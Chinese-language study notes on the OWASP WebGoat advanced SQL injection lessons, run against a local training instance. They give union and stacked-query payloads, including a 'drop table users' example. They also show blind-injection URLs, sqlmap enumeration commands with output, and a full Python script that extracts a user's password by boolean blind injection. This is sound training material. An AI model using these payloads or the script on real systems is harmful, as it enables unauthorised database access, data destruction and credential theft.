## 0x01 Concept & Goals
高级SQL注入  
组合注入、盲注  

## 0x02 Special
一些特殊的东西  
Special Characters  
```1
/* */ 	 are inline comments
-- , # 	 are line comments

Example: Select * from users where name = 'admin' --and pass = 'pass'
```
```2
;        allows query chaining

Example: Select * from users; drop table users;
```
```3
',+,||	 allows string concatenation
Char()	 strings without quotes

Example: Select * from users where name = '+char(27) or 1=1
```
Special Statements  
1. union  
2. join  


## 0x03 Try It! Pulling data from other tables
已经给出了要union查询的表的名字和结构，搞清楚本来的表的大致字段就可以了  
在SQL Injection里知道有一个用户为Smith，先看看正常查询的输出：  
```
USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT,
102, John, Smith, 2435600002222, MC, , 0,
102, John, Smith, 4352209902222, AMEX, , 0, 
```
从输出看，表字段应该是7，可以用order by验证：  
输入`Smith' order by 7 -- -`,输出正确  
输入`Smith' order by 8 -- -`,输出出错，显示"invalid ORDER BY expression"   
构造输入：  
```
Smith' union select userid, user_name, password, null, null, null, null from user_system_data -- -
```
没有值的设为null是为了避免数据类型不匹配的问题  
我的解决方法比较麻烦，其实有简单的方法，参考这个网址：https://blog.csdn.net/u013553529/article/details/82794542  
堆叠查询、union注入，反正没有我那么笨就对了  
堆叠查询：`'; select * from user_system_data --`  
dave的密码是passW0rD  


## 0x04 Blind SQL Injection
介绍报错盲注和时间盲注，相关语句如下：  
```
https://my-shop.com?article=4 AND 1=1
https://my-shop.com?article=4 AND 1=2
https://my-shop.com?article=4 AND substring(database_version(),1,1) = 2


article = 4; sleep(10) --
```


## 0x05 综合题
经过测试，发现注册时的用户名处存在布尔盲注，将如下内容保存为request.txt,开始用sqlmap
：  
```
PUT http://127.0.0.1:8080/WebGoat/SqlInjection/challenge HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://127.0.0.1:8080/WebGoat/start.mvc
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 84
Cookie: JSESSIONID=61E3648728C46675C274BC0980B448BE
Connection: keep-alive
Host: 127.0.0.1:8080

username_reg=hello&email_reg=1%40q.com&password_reg=world&confirm_password_reg=world
```
要注意的是Cookie有时限  
执行如下命令：  
```sh
# 探测数据库类型，结果为：HSQLDB，并且建议加--no-cast参数
sqlmap -r request.txt -p username_reg

# 查数据库，获取3个数据库名：
# [*] INFORMATION_SCHEMA
# [*] PUBLIC
# [*] SYSTEM_LOBS
sqlmap -r request.txt -p username_reg --dbs --no-cast

# 查PUBLIC数据库，选择爆破，线程选最大的10，得到6张表
# Database: PUBLIC
# [6 tables]
# +--------------+
# | auth         |
# | employee     |
# | roles        |
# | servers      |
# | transactions |
# | user_data    |
# +--------------+
sqlmap -r request.txt -p username_reg -D PUBLIC --tables --no-cast

# 获取user_data表的字段
# Database: PUBLIC
# Table: USER_DATA
# [10 columns]
# +-------------+-------------+
# | Column      | Type        |
# +-------------+-------------+
# | cc_number   | non-numeric |
# | cc_type     | non-numeric |
# | cookie      | non-numeric |
# | email       | non-numeric |
# | first_name  | non-numeric |
# | last_name   | non-numeric |
# | login_count | numeric     |
# | password    | non-numeric |
# | today       | numeric     |
# | userid      | numeric     |
# +-------------+-------------+
sqlmap -r request.txt -p username_reg -D PUBLIC -T user_data --columns --no-cast

# 最后一步出错了，，，
```


通过看源码发现，自己连正确的表都没有注出来，sqlmap就不指望了，写脚本跑吧    
```python
# coding:utf8

"""
True: already exists please try to register with a different username.
False: created, please proceed to the login page.

我解这个问题其实是在蒙，用sqlmap爆破发现register的username_reg有bool盲注，然后用sqlmap一通，知道一个表中有password字段，然后sqlmap再往下就出错了，没办法，写脚本吧，已经知道了字段，就直接盲注字段，老是不对，看源码才知道用户名原来是tom，小写的t，这样就得到密码了

但其实看源码之后才发现，sqlmap搞出来的表和我要注入的表是不一样的，就这样吧，误打误撞出来了

源码位置: WebGoat/webgoat-lessons/sql-injection/src/main/java/org/owasp/webgoat/plugin/advanced/SqlInjectionChallenge.java
"""

import requests


def get_status(content):
    if 'already exists please try to register with a different username.' in content:
        return 1
    elif 'created, please proceed to the login page.' in content:
        return 0
    else:
        return -1


url = 'http://127.0.0.1:8080/WebGoat/SqlInjection/challenge'

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'http://127.0.0.1:8080/WebGoat/start.mvc',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': '85',
    'Cookie': 'JSESSIONID=F15EA9332EAE5CFBD726887EA270BC9C',
    'Connection': 'keep-alive',
    'Host': '127.0.0.1:8080',
    }

data = {
    'username_reg': 'a',
    'email_reg': 'a@a.com',
    'password_reg': 'a',
    'confirm_password_reg': 'a',
}

s = requests.session()

tom_pass_len = 0
for i in range(2, 100):
    data['username_reg'] = "tom' AND LENGTH(password)=%d AND '1'='1" % i
    res = s.put(url, headers=headers, data=data)
    if get_status(res.content) == -1:
        print 'Error'
        print res.content
        exit(0)
    elif get_status(res.content) == 0:
        continue
    elif get_status(res.content) == 1:
        print 'password len: %d' % i
        tom_pass_len = i
        break

tom_password = ['*'] * tom_pass_len
common_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
for i in range(1, tom_pass_len+1):
    for c in common_chars:
        data['username_reg'] = "tom' AND SUBSTRING(password, %d, 1)='%s" % (i, c)
        res = s.put(url, headers=headers, data=data)
        if get_status(res.content) == -1:
            print 'Error'
            print res.content
            exit(0)
        elif get_status(res.content) == 0:
            continue
        elif get_status(res.content) == 1:
            print c
            tom_password[i-1] = c
            break

print 'tom_password: ', ''.join(tom_password)
```
参考： https://klarsen.net/infosec/owasp-webgoat-sql-advanced-lesson/  